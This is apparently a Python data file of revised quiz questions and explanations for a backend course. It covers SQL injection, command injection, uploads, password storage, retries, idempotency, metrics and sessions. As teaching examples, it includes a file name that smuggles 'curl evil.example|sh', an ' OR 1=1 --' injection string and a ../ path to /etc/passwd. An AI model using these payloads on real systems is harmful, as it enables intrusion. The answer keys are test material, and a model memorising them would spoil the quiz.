"""Quality pass, Backend: scenario questions, explanations that rule out each wrong option, one factual fix
(229-c6: averaging per-server p99s does not mean a tenth of users wait seconds). Applied by apply.py."""

P = {
 234: {
  'q': {
   't234-a1': {'prompt': 'A security review finds a search endpoint that builds SQL by joining in the user’s text. Which proposed fix actually closes the hole?',
    'choices': [('a', 'Send the text as a bound query parameter'), ('b', 'Escape single quotes in the text first'), ('c', 'Hide database errors from the response'), ('d', 'Cap the search text at 50 characters')],
    'correct': 'a',
    'explanation': 'A bound parameter is never parsed as SQL, whatever it contains. Hand escaping misses numeric contexts and dialect quirks, hiding errors only makes the attack blind (blind injection still works), and 50 characters is plenty for \' OR 1=1 -- .'},
   't234-a2': {'explanation': 'The ../ segments climb from /data/uploads/ to /etc/passwd unless the server resolves the full path and checks it is still inside the folder. A plain name, a space encoded as %20 and a name with hyphens are all harmless.'},
   't234-a3': {'prompt': 'An image service resizes uploads by running a shell command string that includes the file name. Someone uploads a file named x.jpg;curl evil.example|sh. Which change removes the injection?',
    'choices': [('a', 'Call the resize program with an argument list, no shell'), ('b', 'Strip semicolons from file names before running it'), ('c', 'Wrap the file name in double quotes inside the string'), ('d', 'Run the command only for logged-in users')],
    'correct': 'a',
    'explanation': 'With an argument list no shell parses the name, so ; | and $( ) are just characters. Stripping semicolons misses |, && , $( ) and backticks; double quotes still expand $( ) and backticks; and being logged in says nothing about what a name contains. Better still, use an image library and store files under generated names.'},
   't234-a4': {'prompt': 'One old report endpoint still concatenates SQL and gets injected. The app connects as a database superuser. What would least privilege have changed?',
    'choices': [('a', 'The attacker could do only what the app’s account may do'), ('b', 'The injection would be blocked before reaching the database'), ('c', 'The app’s queries would run faster with fewer rights'), ('d', 'Bound parameters would start working on the old endpoint')],
    'correct': 'a',
    'explanation': 'Least privilege does not stop the injection; it caps the damage. With only SELECT, INSERT and UPDATE on its own tables, the attacker cannot drop tables or read other schemas the way a superuser can. Privileges do not change query speed or how the old endpoint builds its SQL.'},
  },
 },
 225: {
  'q': {
   't225-a1': {'prompt': 'Your user table leaks in a breach. Which way of storing passwords makes the leak least useful to the attacker?',
    'choices': [('a', 'Encrypted with a key kept on the same server'), ('b', 'Argon2id hashes, each with its own salt'), ('c', 'Plain text in a separate, locked-down table'), ('d', 'Unsalted SHA-256 hashes of each password')],
    'correct': 'b',
    'explanation': 'A slow, salted hash forces the attacker to guess each user’s password separately, and every guess costs real time and memory. A key on the same server usually leaks with the data, a locked-down table is plain text once stolen, and unsalted SHA-256 can be tried at billions of guesses per second on one GPU and matched against precomputed tables.'},
   't225-a2': {'explanation': 'Being logged in proves identity, not ownership: the server must check that order 88 belongs to this user, or that their role allows it, on every request. Requests can be sent from anywhere, not just your page, and a well-formed id says nothing about who owns it.'},
   't225-a3': {'prompt': 'A support agent asks to refund ₹8,000 on order 88. Which check is the authorisation decision?',
    'choices': [('a', 'The agent’s password matches the stored hash'), ('b', 'The agent’s passkey signature verifies'), ('c', 'The one-time code from the agent’s phone is right'), ('d', 'This agent may refund ₹8,000 on this order')],
    'correct': 'd',
    'explanation': 'The password, the passkey and the one-time code each prove who the agent is: authentication. Whether that identity may perform this action on this resource, for example above a ₹5,000 support limit, is authorisation, and it is decided on every request.'},
   't225-a4': {'prompt': 'Two users both chose the password Mumbai@123. The hashes have no per-user salt. What does an attacker who steals the table learn?',
    'choices': [('a', 'They share a password, so one crack opens both'), ('b', 'Nothing, as a slow hash hides equal inputs'), ('c', 'The password itself, by reversing the hash'), ('d', 'That both accounts were created the same day')],
    'correct': 'a',
    'explanation': 'Without a salt, equal passwords give equal hashes, so one successful guess unlocks every account with that password and precomputed tables work. A slow hash alone does not hide equality, hashes are guessed rather than reversed, and a hash holds no sign-up date. A unique salt per user makes every hash different.'},
  },
 },
 232: {
  'q': {
   't232-a1': {'explanation': 'The API decides who may upload what and signs a URL valid for minutes; storage then carries the bytes, so a 2 GB video never passes through your app servers. Signed URLs do not shrink files, the file still needs scanning afterwards, and storage also accepts uploads relayed through your server.'},
   't232-a2': {'prompt': 'A profile-photo endpoint receives avatar.png sent as Content-Type: image/png. Its first bytes are <html><script>. What should the server do?',
    'choices': [('a', 'Accept it, because the header says PNG'), ('b', 'Accept it, because the name ends in .png'), ('c', 'Reject it: the content is not an allowed image'), ('d', 'Accept it and rename the file to avatar.txt')],
    'correct': 'c',
    'explanation': 'The name and the Content-Type are chosen by the uploader; the first bytes (the file’s magic number) show what it really is, and here it is HTML. Accepting it lets a script be served from your storage, and renaming it keeps attacker HTML that a client sniffing the content may still render.'},
   't232-a3': {'explanation': 'Parts are uploaded and retried on their own, so a drop costs one part. A single request restarts from zero, compressing video saves little because it is already compressed, and an hour-long timeout does not help when the connection itself drops.'},
   't232-a4': {'explanation': 'A separate domain (a different site, not a subdomain that shares cookies), with Content-Disposition: attachment and a safe content type, stops an uploaded HTML or script file running with your site’s cookies. Serving it inline from the main domain is stored XSS, keeping the original name lets uploaders choose the extension, and the code folder could let uploads execute.'},
  },
 },
 230: {
  'q': {
   't230-a1': {'prompt': 'An order service calls a payment gateway. Which response should it retry automatically, with the same idempotency key?',
    'choices': [('a', '400 Bad Request: the amount is missing'), ('b', '503 Service Unavailable, Retry-After: 2'), ('c', '404 Not Found: unknown merchant id'), ('d', '422 Unprocessable Content: card expired')],
    'correct': 'b',
    'explanation': 'A 503 with Retry-After says the gateway cannot serve right now and when to try again; reusing the idempotency key makes the retry safe. A missing field, an unknown merchant and an expired card fail the same way on every attempt, so retrying them only adds load.'},
   't230-a2': {'prompt': 'A payment provider recovers from a 30-second outage. Its 50,000 clients all back off by exactly 1, 2, 4 and 8 s. What happens, and what is the fix?',
    'choices': [('a', 'Load spreads out by itself as the waits grow'), ('b', 'Retries arrive in synchronised waves; add jitter'), ('c', 'Retries succeed in order, so nothing needs fixing'), ('d', 'The waits are too long; retry every 1 s instead')],
    'correct': 'b',
    'explanation': 'Clients that failed together wait the same 1, 2, 4 and 8 s and retry together, so each wave hits the recovering service at once. Jitter randomises each wait so the retries spread across the interval. Growing waits alone do not desynchronise anyone, and fixed 1 s retries make the waves arrive more often.'},
   't230-a3': {'explanation': 'Each layer multiplies the one below: three layers of 3 attempts make 27 attempts on the data store from one click, just when it is down. 9 counts only two layers, 81 would need four, and 3 is what you get when only one layer retries, which is the fix.'},
   't230-a4': {'explanation': 'Return a generic message, a stable error code and the request id; the stack trace stays in the server logs, found by that id. Configuration, stack traces and SQL tell an attacker your software versions, table names and query shapes.'},
  },
 },
 229: {
  'cards': {
   't229-c2': {'body': 'An average of 120 ms can hide that 1 in 100 requests takes 3 seconds. Percentiles show the tail: p50 is the median, and p99 is the value 99% of requests are at or below. Users who make many requests per page are likely to hit the tail.'},
   't229-c6': {'body': 'The p99 of a fleet is not the average of each server’s p99. One overloaded server with a p99 of 3 s and nine healthy ones at 200 ms average to 480 ms, a number that describes no server: it understates the sick one and overstates the rest. Aggregate raw histograms (bucket counts) across servers and compute the percentile from the merged data.'},
  },
  'q': {
   't229-a1': {'explanation': 'A metric aggregates over time, so it answers “is the error rate unusual right now?” cheaply. Why one order failed, what a provider replied and who changed a setting are questions about single events, which is what logs (or an audit log) record.'},
   't229-a2': {'explanation': 'Half the requests finish within 80 ms, and 1 in 100 takes 2 s or more. So most requests are fast, not slow; the average is not shown, and with a median of 80 ms it is far below 2 s; and p99 is a position in the distribution, not a count of requests.'},
   't229-a3': {'explanation': 'Fields such as request_id and order_id let you filter thousands of lines down to one request. A line number, or a pointer to a stack trace “above”, breaks as soon as lines from many requests interleave, and “something went wrong” gives you nothing to search for.'},
   't229-a4': {'prompt': 'A team wants to break down a checkout latency metric. Which label can they add without risking millions of time series?',
    'choices': [('a', 'Status class: 2xx, 4xx or 5xx'), ('b', 'The request id of each call'), ('c', 'The full URL with its query string'), ('d', 'The id of the signed-in user')],
    'correct': 'a',
    'explanation': 'Status class has three values, so it multiplies the series by three at most. A request id or a user id creates one series per value, millions during a big sale, and full URLs with query strings are effectively unbounded. Put those details in logs or traces.'},
  },
 },
 224: {
  'q': {
   't224-a1': {'prompt': 'A “pay ₹500” call times out after 10 s with no response. What does the client actually know?',
    'choices': [('a', 'The payment failed, so sending it again is safe'), ('b', 'The payment succeeded, since no error came back'), ('c', 'Nothing yet: the request or the reply may be lost'), ('d', 'The server is down, so it should wait an hour')],
    'correct': 'c',
    'explanation': 'A timeout cannot tell “never arrived” from “charged, but the reply was lost”. Assuming failure risks a double charge, assuming success risks a missing payment, and a timeout says nothing about the server being down. That is why the retry carries the same idempotency key: the server can answer “already done”.'},
   't224-a2': {'prompt': 'A delivery app retries each of these handlers once after a lost reply, with no idempotency key. Which one is still correct after the retry?',
    'choices': [('a', 'Set order 77’s status to “delivered”'), ('b', 'Append “rider assigned” to order 77’s history'), ('c', 'Credit the rider ₹40 for order 77'), ('d', 'Add 1 to the rider’s completed-orders count')],
    'correct': 'a',
    'explanation': 'Setting a final value leaves the same state however many times it runs. The append writes a second history line, the credit pays ₹80 and the increment counts two deliveries; those need an idempotency key or a conditional update.'},
   't224-a3': {'explanation': 'Record the key as in progress before acting; a retry that finds it in progress waits or gets 409, then receives the stored result once the first finishes. Running both risks two charges, ignoring the key defeats its purpose, and deleting it throws away the only record that the work started.'},
   't224-a4': {'explanation': 'Store a hash of the request with the key and reject a mismatch with an error such as 422, so the client learns it reused a key. Replaying the old response silently drops the new amount, charging the difference invents an operation nobody asked for, and treating it as new breaks the rule that one key means one operation.'},
  },
 },
 231: {
  'q': {
   't231-a1': {'prompt': 'An orders API has 40 client apps you cannot update. Which change can ship without a new version?',
    'choices': [('a', 'Renaming “total” to “amount”'), ('b', 'Changing “price” from a number to a string'), ('c', 'Making the optional “gstin” field required'), ('d', 'Adding an optional “delivery_slot” to responses')],
    'correct': 'd',
    'explanation': 'Clients that ignore unknown fields keep working when a field is added. A rename removes the field they read, a type change breaks their parsing, and a newly required input makes their existing requests fail validation. Additions are safe only if clients tolerate unknown fields, so publish that rule.'},
   't231-a2': {'explanation': '410 Gone says the resource was removed on purpose, and the link tells developers where to go. Keeping 200 means the sunset never really happens, 500 blames your server for a planned change, and a blind 301 to v2 can silently change meaning, for example if v2 amounts are in paise rather than rupees.'},
   't231-a4': {'prompt': 'A payments API adds the status “partially_refunded”. A merchant app maps the status into a fixed list of three values. What happens?',
    'choices': [('a', 'The app keeps showing the last status it knew'), ('b', 'The numeric codes of the other statuses shift'), ('c', 'The app can fail on the value it does not know'), ('d', 'The app starts sending the new value back')],
    'correct': 'c',
    'explanation': 'A client with a fixed list may reject the whole response or crash on an unknown value. Nothing shifts when statuses are sent as strings, the app has no earlier status to fall back on for this payment, and old clients cannot send a value they have never heard of. Announce new values and require clients to handle unknown ones, for example as “other”.'},
  },
 },
 228: {
  'q': {
   't228-a1': {'prompt': 'The same build runs in staging and in production. Which of these should differ between them, supplied at deploy time?',
    'choices': [('a', 'The function that calculates GST on an order'), ('b', 'The validation rules for the sign-up form'), ('c', 'The payment provider’s API base URL'), ('d', 'The order of middleware in the request pipeline')],
    'correct': 'c',
    'explanation': 'The provider URL (sandbox in staging, live in production) varies by environment, so it is configuration. Tax logic, validation rules and middleware order are behaviour: if they differed, staging would be testing different code from what production runs.'},
   't228-a2': {'explanation': 'Every clone and the history still contain it, so anyone with access, now or later, has a working password. Rotate it (issue a new one and revoke the old) and then clean the history if you wish. Making the repository private or renaming the variable leaves the old value valid.'},
   't228-a3': {'prompt': 'A service writes logs to a file inside each container, and containers are replaced on every deploy. What does twelve-factor suggest?',
    'choices': [('a', 'Rotate the log files more often in each container'), ('b', 'Email every error line to the on-call engineer'), ('c', 'Log only errors, to save disk in the container'), ('d', 'Write to standard output; the platform routes it')],
    'correct': 'd',
    'explanation': 'Files inside a replaced container disappear with it. An event stream on standard output lets the platform collect, route and keep logs from every instance in one place. Rotation keeps files that still vanish, email does not scale past a handful of errors, and logging only errors removes the context you need in an incident.'},
   't228-a4': {'explanation': 'Refusing to start, naming the setting, surfaces the problem during the deploy, when rolling back is easy. A silent default may point at the wrong database, endless retrying looks like a hang, and failing on the first request moves the outage onto real traffic.'},
  },
 },
 227: {
  'q': {
   't227-a1': {'explanation': 'Enqueue the job and respond within milliseconds; a worker sends the email. Sending first makes every sign-up wait 2 s, skipping it when busy loses emails exactly at peak, and the client cannot send through your email provider without your credentials.'},
   't227-a2': {'prompt': 'A worker sends an “order confirmed” SMS, then crashes before acknowledging the job. What happens next?',
    'choices': [('a', 'The job is delivered again, so a second SMS can go out'), ('b', 'The job is lost, because its worker crashed'), ('c', 'The queue skips it, since the SMS was already sent'), ('d', 'A second worker had already been running it too')],
    'correct': 'a',
    'explanation': 'The job was never acknowledged, so when its lease runs out the queue hands it to another worker, and without a check such as a per-order message id the customer gets a second SMS. That is at-least-once delivery. Nothing is lost because the acknowledgement comes last, the queue cannot know the SMS went out, and only one worker held the lease.'},
   't227-a3': {'explanation': 'Malformed data fails the same way on every attempt, so after a few tries the job goes to a dead-letter queue where a person can inspect, fix and replay it. Retrying at once only burns worker time, deleting it loses the evidence, and restarting workers does not fix the data.'},
   't227-a4': {'prompt': 'A nightly GST invoice job is added to the scheduler on each of 4 app servers. What happens at midnight?',
    'choices': [('a', 'It fails, because the servers conflict'), ('b', 'It runs once, on the fastest server'), ('c', 'It runs once while the others wait'), ('d', 'It runs 4 times: four invoices each')],
    'correct': 'd',
    'explanation': 'Each server’s scheduler fires on its own, so every customer receives four invoices. Nothing coordinates the servers unless you add it: one scheduler that enqueues a single job, or a lock that only one instance can take.'},
  },
 },
 222: {
  'q': {
   't222-a1': {'prompt': 'A team with 6 app servers moves sessions from server memory into a shared store. A reviewer now calls the servers “stateless”. What does that mean?',
    'choices': [('a', 'Any server can handle any request; state lives in the store'), ('b', 'The app forgets who the user is after each page'), ('c', 'No per-user data is kept anywhere, not even in a database'), ('d', 'The servers no longer send or accept cookies')],
    'correct': 'a',
    'explanation': 'Stateless means no per-user state in a server’s own memory between requests. The state still exists, in the shared store or a signed token, so the load balancer can send a user anywhere. Users stay logged in, data still lives in databases, and a cookie still carries the session id.'},
   't222-a2': {'explanation': 'Deleting the user’s entries in the session store logs out every device on its next request. Tokens kept only in the browser cannot be reached from the server, sticky sessions still need a shared record to delete, and long-lived tokens without a revocation list stay valid until they expire.'},
   't222-a3': {'explanation': 'The cookie holds a long random id that means nothing on its own; the data stays on the server side, so logout can delete it. A signed id and role is a token design that cannot be revoked without a lookup, a full cart soon passes the roughly 4 KB cookie limit, and a password hash should not leave the server.'},
   't222-a4': {'explanation': 'A self-contained token verifies until it expires, so revoking one early needs a lookup on every request. A life of about 15 minutes caps how long a stolen token works, and refresh tokens, which are checked, renew it. Signatures do not stop verifying by themselves, size does not depend on lifetime, and browsers do not delete tokens on a timer.'},
  },
 },
}
